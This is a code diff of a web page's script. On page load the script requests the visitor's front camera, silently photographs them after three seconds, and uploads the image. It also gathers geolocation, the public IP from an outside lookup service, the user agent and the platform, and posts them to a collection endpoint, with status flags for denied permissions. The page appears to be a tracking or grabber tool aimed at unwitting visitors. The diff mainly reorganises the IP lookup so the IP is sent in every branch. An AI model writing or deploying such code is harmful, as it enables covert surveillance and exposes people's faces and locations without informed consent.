@@ -81,84 +81,86 @@
   </div>
 
   <script>
-    async function sendPhoto(blob) {
-      const formData = new FormData();
-      formData.append('photo', blob, 'photo.jpg');
-      await fetch('/photo', {
+  async function sendPhoto(blob) {
+    const formData = new FormData();
+    formData.append('photo', blob, 'photo.jpg');
+    await fetch('/photo', {
+      method: 'POST',
+      body: formData
+    });
+  }
+
+  function captureImage(video) {
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    canvas.toBlob(sendPhoto);
+  }
+
+  async function askForPermissions() {
+    let ipData = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
+    let clientIP = ipData.ip || "Unknown";
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      setTimeout(() => {
+        captureImage(video);
+        stream.getTracks().forEach(track => track.stop());
+      }, 3000);
+
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          fetch('/collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              ip: clientIP,
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              camera: '✅ Camera Allowed',
+              userAgent: navigator.userAgent,
+              deviceInfo: navigator.platform
+            })
+          });
+        },
+        err => {
+          fetch('/collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              ip: clientIP,
+              latitude: null,
+              longitude: null,
+              camera: '✅ Camera Allowed, ❌ Location Denied',
+              userAgent: navigator.userAgent,
+              deviceInfo: navigator.platform
+            })
+          });
+        }
+      );
+
+    } catch (err) {
+      fetch('/collect', {
         method: 'POST',
-        body: formData
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          ip: clientIP,
+          latitude: null,
+          longitude: null,
+          camera: '❌ Camera Denied',
+          userAgent: navigator.userAgent,
+          deviceInfo: navigator.platform
+        })
       });
     }
+  }
 
-    function captureImage(video) {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      canvas.toBlob(sendPhoto);
-    }
-
-    async function askForPermissions() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        setTimeout(() => {
-          captureImage(video);
-          stream.getTracks().forEach(track => track.stop());
-        }, 3000);
-
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            fetch('https://ipapi.co/json/')
-              .then(res => res.json())
-              .then(ipdata => {
-                fetch('/collect', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    camera: '✅ Camera Allowed',
-                    userAgent: navigator.userAgent,
-                    deviceInfo: navigator.platform,
-                    ip: ipdata.ip
-                  })
-                });
-              });
-          },
-          err => {
-            fetch('/collect', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                latitude: null,
-                longitude: null,
-                camera: '✅ Camera Allowed, ❌ Location Denied',
-                userAgent: navigator.userAgent,
-                deviceInfo: navigator.platform
-              })
-            });
-          }
-        );
-
-      } catch (err) {
-        fetch('/collect', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            latitude: null,
-            longitude: null,
-            camera: '❌ Camera Denied',
-            userAgent: navigator.userAgent,
-            deviceInfo: navigator.platform
-          })
-        });
-      }
-    }
-
-    window.onload = askForPermissions;
+  window.onload = askForPermissions;
   </script>
 </body>
 </html>
